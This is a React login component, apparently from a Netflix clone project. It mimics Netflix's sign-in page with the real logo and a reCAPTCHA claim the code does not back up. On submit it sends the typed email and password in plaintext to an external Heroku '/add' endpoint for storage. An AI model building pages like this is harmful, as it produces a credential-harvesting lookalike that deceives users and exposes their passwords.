import './login.scss';
import {useState} from 'react'
import Axios from 'axios'

export default function Login() {
	const [email, setEmail] = useState('');
	const [password, setPassword] = useState('');

	const addUser = () => {
		Axios.post('https://netflixclonebackendr2h.herokuapp.com/add', {
			email: email,
			password: password,
		}).then(() => {
			console.log('Table Updated');
		});
	};
	return (
		<div className='login'>
			<div className='top'>
				<div className='wrapper'>
					<img
						className='logo'
						src='https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/2560px-Netflix_2015_logo.svg.png'
						alt=''
					/>
				</div>
			</div>
			<div className='container'>
				<form>
					<h1>Sign In</h1>
					<input
						type='email'
						placeholder='Email or phone number'
						onChange={(e) => {
							setEmail(e.target.value);
						}}
					/>
					<input
						type='password'
						placeholder='Password'
						onChange={(e) => setPassword(e.target.value)}
					/>
					<input type="submit" value="signin" className='loginButton' onClick={addUser}>
						
					</input>
					<span>
						New to Netflix? <b>Sign up now.</b>
					</span>
					<small>
						This page is protected by Google reCAPTCHA to ensure you're not a
						bot. <b>Learn more</b>.
					</small>
				</form>
			</div>
		</div>
	);
}
